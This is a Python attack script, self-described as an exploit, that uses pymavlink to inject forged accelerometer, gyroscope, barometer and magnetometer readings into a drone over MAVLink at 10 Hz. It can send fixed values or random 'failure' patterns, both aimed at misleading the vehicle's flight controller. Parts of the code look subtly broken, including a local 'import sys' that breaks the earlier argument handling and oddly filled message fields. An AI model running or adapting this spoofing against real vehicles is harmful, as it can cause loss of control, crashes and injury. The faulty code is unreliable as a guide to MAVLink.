#!/usr/bin/env python3
"""
Sensor Data Injection Exploit Script
Injects false IMU, barometer, and magnetometer data
"""

import sys
import time
import random
from pymavlink import mavutil

def inject_imu_data(connection, accel_x=0.0, accel_y=0.0, accel_z=9.8,
                    gyro_x=0.0, gyro_y=0.0, gyro_z=0.0):
    """
    Inject spoofed IMU (accelerometer/gyroscope) data
    
    Args:
        connection: MAVLink connection object
        accel_x/y/z: Accelerometer values in m/s²
        gyro_x/y/z: Gyroscope values in rad/s
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    time_boot_ms = int(time.time() * 1e3) % 4294967295
    
    # Send RAW_IMU message
    connection.mav.raw_imu_send(
        time_boot_ms,
        int(accel_x * 1000),  # Accelerometer in mG
        int(accel_y * 1000),
        int(accel_z * 1000),
        int(gyro_x * 1000),   # Gyroscope in mrad/s
        int(gyro_y * 1000),
        int(gyro_z * 1000),
        int(0),  # Magnetometer (not in RAW_IMU, use SCALED_IMU2)
        int(0),
        int(0)
    )
    
    print(f"[*] Injected IMU: accel=({accel_x:.2f}, {accel_y:.2f}, {accel_z:.2f}), "
          f"gyro=({gyro_x:.2f}, {gyro_y:.2f}, {gyro_z:.2f})")

def inject_barometer_data(connection, pressure=101325.0, temperature=15.0):
    """
    Inject spoofed barometer data
    
    Args:
        connection: MAVLink connection object
        pressure: Pressure in Pascal
        temperature: Temperature in Celsius
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    time_boot_ms = int(time.time() * 1e3) % 4294967295
    
    # Send SCALED_PRESSURE message
    connection.mav.scaled_pressure_send(
        time_boot_ms,
        pressure / 100.0,  # Pressure in hPa
        int((pressure / 100.0) - 1013.25) * 100,  # Pressure altitude
        int(temperature * 100)  # Temperature in centi-degrees
    )
    
    print(f"[*] Injected barometer: pressure={pressure:.1f} Pa, temp={temperature:.1f}°C")

def inject_magnetometer_data(connection, mag_x=0.0, mag_y=0.0, mag_z=0.0):
    """
    Inject spoofed magnetometer data
    
    Args:
        connection: MAVLink connection object
        mag_x/y/z: Magnetometer values in gauss
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    time_boot_ms = int(time.time() * 1e3) % 4294967295
    
    # Send SCALED_IMU2 message (includes magnetometer)
    connection.mav.scaled_imu2_send(
        time_boot_ms,
        0, 0, 0,  # Accelerometer (not used in this message)
        0, 0, 0,  # Gyroscope (not used in this message)
        int(mag_x * 1000),  # Magnetometer in mG
        int(mag_y * 1000),
        int(mag_z * 1000)
    )
    
    print(f"[*] Injected magnetometer: ({mag_x:.3f}, {mag_y:.3f}, {mag_z:.3f}) gauss")

def create_sensor_failure_pattern(sensor_type='imu'):
    """
    Create sensor failure pattern
    
    Args:
        sensor_type: Type of sensor ('imu', 'baro', 'mag')
    
    Returns:
        Generator function for sensor values
    """
    if sensor_type == 'imu':
        # Simulate IMU failure (zero or random values)
        while True:
            yield {
                'accel': (random.uniform(-50, 50), random.uniform(-50, 50), random.uniform(-50, 50)),
                'gyro': (random.uniform(-10, 10), random.uniform(-10, 10), random.uniform(-10, 10))
            }
    elif sensor_type == 'baro':
        # Simulate barometer failure (wrong pressure)
        while True:
            yield {
                'pressure': random.uniform(50000, 150000),  # Unrealistic pressure
                'temperature': random.uniform(-50, 100)
            }
    elif sensor_type == 'mag':
        # Simulate magnetometer failure (wrong heading)
        while True:
            yield {
                'mag': (random.uniform(-2, 2), random.uniform(-2, 2), random.uniform(-2, 2))
            }

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 sensor_data_injection.py <connection> <sensor> [values...]")
        print("Example: python3 sensor_data_injection.py udp:127.0.0.1:14550 imu")
        print("Example: python3 sensor_data_injection.py udp:127.0.0.1:14550 imu 0 0 0 0 0 0")
        print("Example: python3 sensor_data_injection.py udp:127.0.0.1:14550 baro 50000 25")
        print("Example: python3 sensor_data_injection.py udp:127.0.0.1:14550 mag 0.1 0.2 0.3")
        print("\nSensors: imu, baro, mag, all")
        print("Use --failure to simulate sensor failure")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    sensor = sys.argv[2] if len(sys.argv) > 2 else 'all'
    simulate_failure = '--failure' in sys.argv
    
    # Validate sensor type
    if sensor not in ['imu', 'baro', 'mag', 'all']:
        print(f"[-] Unknown sensor type: {sensor}")
        print("[*] Valid sensors: imu, baro, mag, all")
        sys.exit(1)
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Inject sensor data
    print(f"[*] Injecting {sensor} sensor data (Press Ctrl+C to stop)...")
    try:
        while True:
            if simulate_failure:
                if sensor == 'imu' or sensor == 'all':
                    pattern = create_sensor_failure_pattern('imu')
                    values = next(pattern)
                    inject_imu_data(connection, *values['accel'], *values['gyro'])
                
                if sensor == 'baro' or sensor == 'all':
                    pattern = create_sensor_failure_pattern('baro')
                    values = next(pattern)
                    inject_barometer_data(connection, values['pressure'], values['temperature'])
                
                if sensor == 'mag' or sensor == 'all':
                    pattern = create_sensor_failure_pattern('mag')
                    values = next(pattern)
                    inject_magnetometer_data(connection, *values['mag'])
            else:
                # Use provided values or defaults
                if sensor == 'imu' or sensor == 'all':
                    if len(sys.argv) > 3:
                        accel_x, accel_y, accel_z = float(sys.argv[3]), float(sys.argv[4]), float(sys.argv[5])
                        gyro_x, gyro_y, gyro_z = float(sys.argv[6]), float(sys.argv[7]), float(sys.argv[8])
                    else:
                        accel_x, accel_y, accel_z = 0.0, 0.0, 9.8
                        gyro_x, gyro_y, gyro_z = 0.0, 0.0, 0.0
                    inject_imu_data(connection, accel_x, accel_y, accel_z, gyro_x, gyro_y, gyro_z)
                
                if sensor == 'baro' or sensor == 'all':
                    if len(sys.argv) > 3:
                        pressure = float(sys.argv[3])
                        temperature = float(sys.argv[4]) if len(sys.argv) > 4 else 15.0
                    else:
                        pressure = 101325.0
                        temperature = 15.0
                    inject_barometer_data(connection, pressure, temperature)
                
                if sensor == 'mag' or sensor == 'all':
                    if len(sys.argv) > 3:
                        mag_x, mag_y, mag_z = float(sys.argv[3]), float(sys.argv[4]), float(sys.argv[5])
                    else:
                        mag_x, mag_y, mag_z = 0.0, 0.0, 0.0
                    inject_magnetometer_data(connection, mag_x, mag_y, mag_z)
            
            time.sleep(0.1)  # Send at 10 Hz
            
    except KeyboardInterrupt:
        print("\n[*] Stopping sensor data injection...")

if __name__ == "__main__":
    main()
